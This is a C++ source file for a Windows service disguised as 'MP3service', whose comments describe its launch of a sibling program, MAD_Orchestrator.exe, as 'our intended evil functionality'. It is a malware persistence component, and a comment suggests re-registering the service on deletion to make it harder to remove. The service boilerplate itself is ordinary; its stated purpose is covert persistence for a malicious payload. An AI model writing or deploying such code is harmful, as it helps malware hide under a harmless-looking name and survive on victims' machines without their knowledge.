#include <windows.h>
#include <iostream>
#include <filesystem>
#define SLEEP_TIME 1000

/*
  This is a boilerplate for any windows service you wish to install
  it does 3 things:
  1) Main --> the normal program entry point, it calls the controller dispatcher
  2) ServiceController --> that handles windows-sent events like stop service, start service, delete service, etc.
  3) ServiceMain --> the main function of the service, that runs 24x7 in the background (you inject your code in this function)
*/





SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE hStatus;

std::string GetAbsExePath()
{
    char exepath [255];
    DWORD result = GetModuleFileNameA(NULL, exepath, 255);
    std::filesystem::path path(exepath);

    return path.string();
}


int launch_MAD_Orch()
{
  /*
    This is our intended evil functionality, which is just launching MAD_Orchestrator once
  */
    void * lb;
    BOOL rv;
    HANDLE th;


    std::filesystem::path path(GetAbsExePath());
    std::string parentPath = path.parent_path().string() + std::string("\\MAD_Orchestrator.exe");  //this line translates to the absolute path of the executable "sound.exe" which is inside the same directory of this current executable file
    
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    CreateProcessA(NULL, const_cast<char *>(parentPath.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    return 0;
}



void ControlHandler(DWORD request) {
  /*
    This is the service's Control Handler, that handles windows-triggered events like service stop, service start, service delete, etc.
    You can actually inject malicious code here in the deletion handler to register the service again hence achieving greater persistence, but I decided not to.  
  */
  switch(request) {
    case SERVICE_CONTROL_STOP:
      serviceStatus.dwWin32ExitCode = 0;
      serviceStatus.dwCurrentState  = SERVICE_STOPPED;
      SetServiceStatus (hStatus, &serviceStatus);
      return;

    case SERVICE_CONTROL_SHUTDOWN:
      serviceStatus.dwWin32ExitCode = 0;
      serviceStatus.dwCurrentState  = SERVICE_STOPPED;
      SetServiceStatus (hStatus, &serviceStatus);
      return;
  

    default:
      break;
  }
  SetServiceStatus(hStatus,  &serviceStatus);
  return;
}


void ServiceMain(int argc, char** argv) {
  /*
    This is the service main function that stays running 24x7
    it contains two parts: initialization logic and continuous logic
    1) Initialization logic: initializing any variables, preparing everything, like the setup() in arduino
    2) Continuous logic: just a while loop, code in this loop is repetitevly running, like the loop() in arduino
  */
  serviceStatus.dwServiceType        = SERVICE_WIN32;
  serviceStatus.dwCurrentState       = SERVICE_START_PENDING;
  serviceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
  serviceStatus.dwWin32ExitCode      = 0;
  serviceStatus.dwServiceSpecificExitCode = 0;
  serviceStatus.dwCheckPoint         = 0;
  serviceStatus.dwWaitHint           = 0;

  hStatus = RegisterServiceCtrlHandlerA("MP3service", (LPHANDLER_FUNCTION)ControlHandler);
  launch_MAD_Orch();

  serviceStatus.dwCurrentState = SERVICE_RUNNING;
  SetServiceStatus (hStatus, &serviceStatus);

  while (serviceStatus.dwCurrentState == SERVICE_RUNNING) { //this is the continuous logic block
    Sleep(SLEEP_TIME);
  }
  return;
}







int main() {
  // The main entry point to the service program, NOT THE SERVICE MAIN LOGIC
  // This gets run only once then you forget about it.
    char srv [] = "MP3service";
    
  SERVICE_TABLE_ENTRYA ServiceTable[] = {
    {srv, (LPSERVICE_MAIN_FUNCTIONA) ServiceMain},
    {NULL, NULL}
  };

  StartServiceCtrlDispatcherA(ServiceTable);
  return 0;
}